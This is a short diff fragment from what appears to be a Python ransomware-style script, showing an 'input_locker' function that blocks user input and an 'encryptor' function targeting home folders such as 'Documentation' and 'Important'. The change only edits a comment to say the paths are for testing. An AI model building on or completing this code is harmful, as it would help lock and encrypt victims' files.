@@ -34,7 +34,7 @@ def input_locker():#This blocks user input
 
 
 def encryptor():
-        #This encrypts all listed folder paths
+        #This encrypts all listed folder paths.These folder paths are for testing. Change them for your specific testing purposes.
         folders_path = [
         str(os.path.join(Path.home(), "Documentation")),
         str(os.path.join(Path.home(), "Important")),
